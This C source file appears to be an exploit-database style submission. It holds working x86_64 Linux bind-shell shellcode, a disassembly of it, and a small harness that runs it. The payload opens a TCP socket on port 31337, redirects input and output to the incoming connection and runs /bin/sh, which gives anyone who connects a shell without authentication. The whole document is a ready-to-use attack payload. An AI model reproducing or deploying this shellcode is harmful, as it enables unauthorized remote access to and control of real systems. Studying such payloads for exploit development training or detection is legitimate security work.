/*
Title   : tcpbindshell  (150 bytes)
Date    : 04 October 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86_64 (SMP Debian 3.2.46-1+deb7u1 x86_64 GNU/Linux)

$ objdump -D tcpbindshell -M intel
tcpbindshell:     file format elf64-x86-64
Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 31 c0             	xor    rax,rax
  400083:	48 31 ff             	xor    rdi,rdi
  400086:	48 31 f6             	xor    rsi,rsi
  400089:	48 31 d2             	xor    rdx,rdx
  40008c:	4d 31 c0             	xor    r8,r8
  40008f:	6a 02                	push   0x2
  400091:	5f                   	pop    rdi
  400092:	6a 01                	push   0x1
  400094:	5e                   	pop    rsi
  400095:	6a 06                	push   0x6
  400097:	5a                   	pop    rdx
  400098:	6a 29                	push   0x29
  40009a:	58                   	pop    rax
  40009b:	0f 05                	syscall 
  40009d:	49 89 c0             	mov    r8,rax
  4000a0:	4d 31 d2             	xor    r10,r10
  4000a3:	41 52                	push   r10
  4000a5:	41 52                	push   r10
  4000a7:	c6 04 24 02          	mov    BYTE PTR [rsp],0x2
  4000ab:	66 c7 44 24 02 7a 69 	mov    WORD PTR [rsp+0x2],0x697a
  4000b2:	48 89 e6             	mov    rsi,rsp
  4000b5:	41 50                	push   r8
  4000b7:	5f                   	pop    rdi
  4000b8:	6a 10                	push   0x10
  4000ba:	5a                   	pop    rdx
  4000bb:	6a 31                	push   0x31
  4000bd:	58                   	pop    rax
  4000be:	0f 05                	syscall 
  4000c0:	41 50                	push   r8
  4000c2:	5f                   	pop    rdi
  4000c3:	6a 01                	push   0x1
  4000c5:	5e                   	pop    rsi
  4000c6:	6a 32                	push   0x32
  4000c8:	58                   	pop    rax
  4000c9:	0f 05                	syscall 
  4000cb:	48 89 e6             	mov    rsi,rsp
  4000ce:	48 31 c9             	xor    rcx,rcx
  4000d1:	b1 10                	mov    cl,0x10
  4000d3:	51                   	push   rcx
  4000d4:	48 89 e2             	mov    rdx,rsp
  4000d7:	41 50                	push   r8
  4000d9:	5f                   	pop    rdi
  4000da:	6a 2b                	push   0x2b
  4000dc:	58                   	pop    rax
  4000dd:	0f 05                	syscall 
  4000df:	59                   	pop    rcx
  4000e0:	4d 31 c9             	xor    r9,r9
  4000e3:	49 89 c1             	mov    r9,rax
  4000e6:	4c 89 cf             	mov    rdi,r9
  4000e9:	48 31 f6             	xor    rsi,rsi
  4000ec:	6a 03                	push   0x3
  4000ee:	5e                   	pop    rsi
00000000004000ef <doop>:
  4000ef:	48 ff ce             	dec    rsi
  4000f2:	6a 21                	push   0x21
  4000f4:	58                   	pop    rax
  4000f5:	0f 05                	syscall 
  4000f7:	75 f6                	jne    4000ef <doop>
  4000f9:	48 31 ff             	xor    rdi,rdi
  4000fc:	57                   	push   rdi
  4000fd:	57                   	push   rdi
  4000fe:	5e                   	pop    rsi
  4000ff:	5a                   	pop    rdx
  400100:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
  400107:	2f 73 68 
  40010a:	48 c1 ef 08          	shr    rdi,0x8
  40010e:	57                   	push   rdi
  40010f:	54                   	push   rsp
  400110:	5f                   	pop    rdi
  400111:	6a 3b                	push   0x3b
  400113:	58                   	pop    rax
  400114:	0f 05                	syscall 

  Code not is not optimal, this is left as an exercise to the reader ;^)
  
*/

#include <stdio.h>
  
#define PORT "\x7a\x69" /* 31337 */
  
unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
PORT"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
 
int
main(void)
{
    printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}